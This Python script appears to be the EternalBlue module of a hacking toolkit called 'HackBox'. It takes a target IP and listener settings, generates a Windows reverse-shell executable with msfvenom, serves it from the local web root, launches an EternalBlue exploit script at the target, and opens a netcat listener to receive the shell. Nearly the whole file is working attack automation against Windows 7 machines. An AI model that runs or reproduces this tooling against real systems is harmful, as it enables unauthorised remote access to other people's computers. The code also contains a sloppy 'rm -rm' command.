import os

print('''
    Eternal Blue

a) Windows 7 & User + Pass


---

q)Exit/Quit
---
x)Attack Mode
y)Defense Mode
z)Recon Mode
    ''')

statement = input().lower()

while True:
    if statement == 'a':
        ## add some code to generate a default payload with msfvenom or something
        print('Enter Target IP')
        targetIP = input()
        print('Enter Listen IP')
        listenIP = input()
        print('Enter Listen Port')
        listenPORT = input()
        #print('Enter payload')
        #payload = input.() --- -- This will need some work with SED or something similar - or just echo in the payload code?
        os.system('rm -rm /var/www/html/sc.exe')
        #Removing old listener, and adding  new one to web server
        os.system('msfvenom -p windows/shell/reverse_tcp LHOST=' + listenIP + ' LPORT=' + listenPORT + ' -i 10 -f exe > /var/www/html/sc.exe')
	# running exploit
        os.system('python2 Modules/attack/exploits/Eternal_Blue_7/eternalblue.py ' + targetIP)
        print('\n -- If the exploit completed correctly, a shell should appear below -- \n')
        #listening and opening shell
        os.system('nc -nvlp ' + listenPORT)



# ----------- moving around ---------------------#

    elif statement=="d":
        print("\n Goodbye")
        ans = None
    elif statement=="q":
        os.system('clear')
        exec(open('HackBox.py').read())
        ans = None
# ------------ Mode Switch ----------------------#
    elif statement=="x":
        exec(open('Modules/attack/Attack.py').read())
    elif statement=="y":
        exec(open('Modules/defense/Defense.py').read())
    elif statement=="z":
        exec(open('Modules/recon/Recon.py').read())



    else:
        print('Invalid command, try again')

    statement = input().lower()
